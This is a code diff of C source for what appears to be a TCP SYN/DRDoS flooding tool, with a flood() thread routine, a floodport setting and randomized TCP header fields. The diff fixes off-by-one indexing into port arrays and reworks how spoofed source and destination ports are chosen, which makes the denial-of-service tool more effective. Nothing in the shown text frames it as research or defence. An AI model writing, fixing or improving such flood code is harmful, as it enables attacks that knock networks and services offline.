@@ -193,7 +193,7 @@ int windows[4] = {8192, 65535, 14600, 64240};
 
 void setup_tcp_header(struct tcphdr *tcph)
 {
-	tcph->dest = htons(sPorts[randnum(0, 4)]);
+	tcph->dest = htons(sPorts[randnum(0, 3)]);
 	tcph->source = htons(floodport);
 	tcph->ack = 0;
 	tcph->ack_seq = randnum(10000, 99999);
@@ -336,18 +336,18 @@ void *flood(void *par1)
 		}
 		else
 		{
-			int drdossType = dPorts[randnum(0, 4)];
+			int drdossType = sPorts[randnum(0, 3)];
 
 			if (floodport == 0)
 			{
 				if (randnum(0, 1) == 1)
 				{
-					tcph->dest = htons(randnum(1, 65535));
-					tcph->source = htons(sPorts[randnum(0, 4)]);
+					tcph->dest = htons(sPorts[randnum(0, 3)]);
+					tcph->source = htons(randnum(1024, 65535));
 				}
 				else
 				{
-					tcph->dest = htons(sPorts[randnum(0, 4)]);
+					tcph->dest = htons(sPorts[randnum(0, 3)]);
 					tcph->source = htons(randnum(1, 65535));
 				}
 			}
@@ -361,7 +361,7 @@ void *flood(void *par1)
 				else
 				{
 					tcph->source = htons(floodport);
-					tcph->dest = htons(sPorts[randnum(0, 4)]);
+					tcph->dest = htons(sPorts[randnum(0, 3)]);
 				}
 			}
 			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
